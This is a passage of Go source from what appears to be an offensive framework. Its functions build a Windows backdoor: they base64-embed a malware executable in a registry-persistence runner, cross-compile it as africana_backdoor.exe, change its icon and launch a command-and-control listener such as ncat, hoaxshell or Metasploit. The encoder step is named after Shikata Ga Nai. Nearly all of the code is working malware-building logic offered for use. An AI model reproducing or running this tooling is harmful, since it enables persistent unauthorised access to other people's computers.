    fmt.Printf("\n%s[>] %shooking .exe with .dll for persistence ...\n\n", bcolors.Yellow, bcolors.Endc)
    // Create spinner with custom options
    spinner := utils.New(
        utils.WithStyle("arrow"),
        utils.WithText("%s[+] %sCompiling the final backdooor ...", bcolors.Green, bcolors.Endc),
        utils.WithEffect("plain"),
        utils.WithSpeed(45 * time.Millisecond),
    )

    spinner.Start()
    buildCmd := "go build -o %s %s"
    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)
    spinner.Stop()

    IconChanger(Icon)
    log.Printf("\n%s[+] %scomplete backdoor saved at: %s%s%s\n", bcolors.Green, bcolors.Endc, bcolors.BrightBlue, endMalwarePath, bcolors.Endc)
    ListenerLauncher(C2, Lport, Hport, Protocol)
}

//regestry persistence mechanisim//
func CodeBreakers(ToolsDir string, Lport string, Hport string, Protocol string, Script string, Icon string, C2 string) {
    ShikataGanai(ToolsDir, Lport, Hport, Protocol, Script, C2)

    exeFilePath := "/root/.afr3/output/malware_complete.exe"
    exeData, err := ioutil.ReadFile(exeFilePath)

    if err != nil {
        log.Fatalf(bcolors.BrightRed + "[!] " + bcolors.Endc + "Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)

    src := filepath.Join(ToolsDir, "exploits/windows/payload_templates/go_exploits/malware_runner_reg.go")
    dst := filepath.Join(OutPutDir, "malware_runner_reg.go")

    if err := utils.Copy(src, dst); err != nil {
        log.Fatal("Copy failed:", err)
    } else {
        fmt.Printf("\n%s[+] %sCopy succeeded!\n", bcolors.BrightGreen, bcolors.Endc)
    }

    filesToReplacements := map[string]map[string]string{
        "/root/.afr3/output/malware_runner_reg.go": {
        "africanas": encodedExe,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf(bcolors.BrightRed + "[!] " + bcolors.Endc + "Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf(bcolors.BrightRed + "[!] " + bcolors.Endc + "Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.afr3/output/malware_runner_reg.go"
    endMalwarePath := "/root/.afr3/output/africana_backdoor.exe"
    fmt.Printf("\n%s[>] %shooking .exe with .dll for persistence ...\n\n", bcolors.Yellow, bcolors.Endc)
    // Create spinner with custom options
    spinner := utils.New(
        utils.WithStyle("arrow"),
        utils.WithText("%s[+] %sCompiling the final backdooor ...", bcolors.Green, bcolors.Endc),
        utils.WithEffect("plain"),
        utils.WithSpeed(45 * time.Millisecond),
    )

    spinner.Start()
    buildCmd := "go build -o %s %s"
    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)
    spinner.Stop()

    IconChanger(Icon)
    log.Printf("\n%s[+] %scomplete backdoor saved at: %s%s%s\n", bcolors.Green, bcolors.Endc, bcolors.BrightBlue, endMalwarePath, bcolors.Endc)
    ListenerLauncher(C2, Lport, Hport, Protocol)
}

func ListenerLauncher(C2 string, Lport string, Hport string, Protocol string) {
    fmt.Printf("\n%s[>] %sLaunching %sc2 ...", bcolors.Yellow, bcolors.Endc, C2)
    switch strings.ToLower(C2) {
    case "ncat":
        Ncat(Lport, Protocol)
        return
    case "hoaxshell":
        HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir)
        return
    case "blackjack":
        BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir)
        return
    case "metasploit":
        Metasploit(Lhost, Lport, Protocol)
        return
    default:
        fmt.Println("\n%s[!] %sError: Invalid LISTENER type", bcolors.BrightRed, bcolors.Endc)
    }
}
